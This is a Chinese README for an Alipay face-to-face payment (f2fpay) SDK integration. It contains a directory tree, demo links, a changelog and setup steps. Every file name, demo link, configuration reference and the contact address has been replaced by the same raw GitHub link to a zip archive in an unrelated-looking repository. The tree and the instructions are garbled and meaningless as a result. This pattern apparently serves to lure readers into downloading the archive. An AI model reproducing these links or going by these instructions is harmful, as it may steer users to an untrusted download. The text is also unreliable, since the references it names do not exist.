### 目录树如下  
├── demo 目录为对接的一些程序，能用的  
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip //SDK入口文件   
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip //配置文件   
├── f2fpay //SDK文件    
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip  //异步验证文件    
├── pay //支付页面   
│   ├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
│   ├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
│   └── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip // 创建支付文件   
├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip //订单查询页面   
└── static //静态文件页面   
    ├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
    ├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
    ├── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   
    └── https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip   


DEMO: [https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip](https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip)

对接程序DEMO
发卡 [https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip](https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip)

---

简介: 
通过对支付宝f2fpay SDK的二次开发，实现在线支付功能。

---

更新记录:   
2019.8.27  
新增一个发卡的DEMO  
2019.8.19 
重构，现在可以`一键切换`是否需要记录订单。(https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip中)   
2019.8.5 
第一次提交

---

使用方法：
1. 修改https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip ，填入你的支付宝公钥/私钥/PID 
2. 根据https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip 提示是否需要订单记录，使用注释中的SQL创建数据表，并修改相关数据库配置。
3. 检查https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip中的 notify_url 确认公网可访问
4. 完成。

---

主要逻辑：
1. 生成订单插入数据库-->显示二维码供用户支付-->支付完成后支付宝异步通知到https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip>https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip对支付宝传来的数据进行校验，改变数据库中订单状态-->https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip返回订单成功状态-->完成支付  
2. 生成订单-->显示二维码-->直接根据支付宝的接口查询订单状态-->成功


可`有偿`提供 对接各种程序 服务，如有需要请联系邮箱 'yumusb艾特https://raw.githubusercontent.com/haikesikejiqiang/dangmianfu/master/f2fpay/dangmianfu_2.7.zip'。
